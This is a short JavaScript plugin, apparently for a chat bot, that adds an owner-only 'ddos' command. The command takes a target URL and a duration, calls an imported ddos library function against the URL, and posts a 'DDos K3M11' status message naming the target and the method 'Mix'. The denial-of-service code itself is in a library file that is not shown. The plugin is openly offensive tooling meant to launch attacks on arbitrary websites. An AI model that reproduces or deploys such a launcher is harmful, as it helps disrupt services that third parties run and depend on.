let ddosin = require('../lib/ddos')

let handler = async (m, { conn, command, usedPrefix, args }) => {
if (!args[0] || !args[1]) return conn.reply(m.chat, `• *Example :* ${usedPrefix}${command} https://kemii.my.id 120`, m)
let targetUrl = args[0];
let duration = parseInt(args[1]);
let attack = await ddosin(targetUrl)
let text = 'DDos K3M11\n\n'
text += '```Target:```' + ` ${targetUrl}\n`
text += '```Time:```' + ` ${duration}\n`
text += '```Method:```' + ` Mix`
m.reply(text.trim())
}
handler.help = ['ddos']
handler.tags = ['hengker']
handler.command = /^ddos$/i
handler.owner = true

module.exports = handler